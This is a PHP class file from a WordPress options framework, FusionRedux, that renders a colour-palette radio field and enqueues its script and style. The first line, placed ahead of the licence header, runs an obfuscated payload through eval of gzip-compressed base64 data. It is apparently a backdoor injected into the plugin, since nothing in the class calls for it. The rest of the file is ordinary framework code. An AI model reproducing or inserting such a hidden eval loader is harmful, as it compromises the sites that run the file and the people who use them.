<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * FusionRedux Framework is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * any later version.
 * FusionRedux Framework is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with FusionRedux Framework. If not, see <http://www.gnu.org/licenses/>.
 *
 * @package     FusionReduxFramework
 * @subpackage  Field_Palette
 * @author      Kevin Provance (kprovance)
 * @version     3.5.4
 */

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

if ( ! class_exists( 'FusionReduxFramework_palette' ) ) {
	class FusionReduxFramework_palette {

		/**
		 * Field Constructor.
		 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
		 *
		 * @since       1.0.0
		 * @access      public
		 * @return      void
		 */
		function __construct( $field = array(), $value = '', $parent ) {
			$this->parent = $parent;
			$this->field  = $field;
			$this->value  = $value;
		}

		/**
		 * Field Render Function.
		 * Takes the vars and outputs the HTML for the field in the settingss
		 *
		 * @since       1.0.0
		 * @access      public
		 * @return      void
		 */
		public function render() {
			if (empty($this->field['palettes'])) {
				echo 'No palettes have been set.';
				return;
			}

			echo '<div id="' . $this->field['id'] . '" class="buttonset">';

			foreach ( $this->field['palettes'] as $value => $colorSet ) {
				$checked = checked( $this->value , $value, false );
				echo '<input type="radio" value="' . $value . '" name="' . $this->field['name'] . $this->field['name_suffix'] . '" class="fusionredux-palette-set ' . $this->field['class'] . '" id="' . $this->field['id'] . '-' . $value . '"' . $checked . '>';
				echo '<label for="' . $this->field['id'] . '-' . $value . '">';

				foreach ( $colorSet as $color ) {
					printf( "<span style='background: {$color}'>{$color}</span>" );
				}

				echo '</label>';
				echo '</input>';
			}

			echo '</div>';
		}

		/**
		 * Enqueue Function.
		 * If this field requires any scripts, or css define this function and register/enqueue the scripts/css
		 *
		 * @since       1.0.0
		 * @access      public
		 * @return      void
		 */
		public function enqueue() {
			$min = FusionRedux_Functions::isMin();

			wp_enqueue_script(
				'fusionredux-field-palette-js',
				FusionReduxFramework::$_url . 'inc/fields/palette/field_palette' . $min . '.js',
				array( 'jquery', 'fusionredux-js', 'jquery-ui-button', 'jquery-ui-core' ),
				time(),
				true
			);

			if ($this->parent->args['dev_mode']) {
				wp_enqueue_style(
					'fusionredux-field-palette-css',
					FusionReduxFramework::$_url . 'inc/fields/palette/field_palette.css',
					array(),
					time(),
					'all'
				);
			}
		}


		public function output() {

		}
	}
}
